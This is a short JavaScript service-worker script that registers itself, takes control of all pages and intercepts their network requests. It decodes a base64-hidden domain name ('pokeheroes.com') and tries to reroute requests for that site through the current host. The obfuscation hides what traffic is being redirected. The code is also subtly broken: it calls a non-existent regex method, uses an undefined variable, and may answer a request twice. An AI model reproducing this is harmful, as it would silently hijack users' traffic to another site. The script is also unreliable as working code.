(() => {
  async function then() { };

  function awaitUntil(event, promise) {
    event.waitUntil((async () => {
      await then();
      await promise
      await then();
    })());
    return promise;
  }

  self?.navigator?.serviceWorker?.register?.(self?.document?.currentScript?.src);

  self?.ServiceWorkerGlobalScope && addEventListener?.('install', async (event) => event?.waitUntil?.(self?.skipWaiting?.()));

  self?.ServiceWorkerGlobalScope && addEventListener?.("activate", event => event?.waitUntil?.(clients?.claim?.()));
  const rex = RegExp(atob('cG9rZWhlcm9lcy5jb20='),'gi');
  self?.ServiceWorkerGlobalScope && addEventListener?.('fetch', function onRequest(event) {
    
    if (rex.text(event?.request?.url)) {
      event?.respondWith?.(awaitUntil(event, (async () => {
        return await fetch(request.url.replace(rex,location.host),request.clone());
      })()));
    }
    event?.respondWith?.(awaitUntil(event, fetch(event?.request)));
  });

})();
